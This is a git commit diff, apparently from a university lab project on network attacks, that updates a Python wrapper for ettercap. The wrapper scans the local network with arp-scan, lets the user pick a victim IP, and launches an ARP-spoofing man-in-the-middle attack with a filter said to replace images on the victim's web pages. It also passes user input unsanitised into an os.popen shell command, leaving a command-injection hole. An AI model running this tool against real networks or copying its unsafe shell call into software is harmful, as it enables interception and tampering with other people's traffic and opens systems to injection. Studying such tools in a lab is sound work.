12ef3c7d8edecd631988c73fe969cff8885b2c9e
Julian Rieder <jur6445@fhi.de>
2015-11-11 13:48:06 +0100

    Update of network attacks; Architecture updated

--- Netzwerke/ettercap/ettercap.py
+++ Netzwerke/ettercap/ettercap.py
@@ -3,18 +3,21 @@ import os
 import subprocess
 import re
 import colors
+import attackBase
 
-class ArpSpoofing():
+class ArpSpoofing(attackBase.Attack):
 	interface = "eth0"
 	ipAddress = ""
 	shellCol = colors.ShellColors
 	def ifaceData(self):
-		subprocess.call(["ifconfig"])
-                interface = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "Select Interface: " + self.shellCol.ENDC)
+		#subprocess.call(["ifconfig"])
+		print "\nAvailable Interfaces: "
+		subprocess.call(["ls", "/sys/class/net"])
+                interface = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nSelect Interface: " + self.shellCol.ENDC)
 		interfaceData = os.popen('ifconfig ' + interface + '| grep "inet\ Ad" | cut -d: -f2 | cut -d" " -f1') 
 		print self.shellCol.BLUE + "\nSelect one of the shown Addresses to attack: " + self.shellCol.ENDC
 		subprocess.call(["arp-scan", "--interface="+interface, "--localnet"])
-		ipAddress = raw_input(self.shellCol.BLUE + "Selected Interface: " + self.shellCol.ENDC)
+		ipAddress = raw_input(self.shellCol.BLUE + "Select IP Address: " + self.shellCol.ENDC)
 		# Check if IP Address has a valid format
 		matchObj = re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ipAddress)		
 		if matchObj:
@@ -41,8 +44,9 @@ class ArpSpoofing():
 	# Replaces all images of websites on the attacked host
 	def ettercapFun(self):
 		self.ifaceData()
-		filter = "/usr/share/ettercap/catFilter.ef"
-		subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", self.interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])
+		filter = "/usr/share/ettercap/test.ef"
+		subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", self.interface, "-M", "ARP", "/"+self.ipAddress+"//", "///", "&"])
+	
 	
 	@staticmethod
 	def start(self, index):
@@ -50,3 +54,5 @@ class ArpSpoofing():
 			self.ettercapMITM()
 		elif(index == 2):
 			self.ettercapFun()
+
+	def help(self): pass
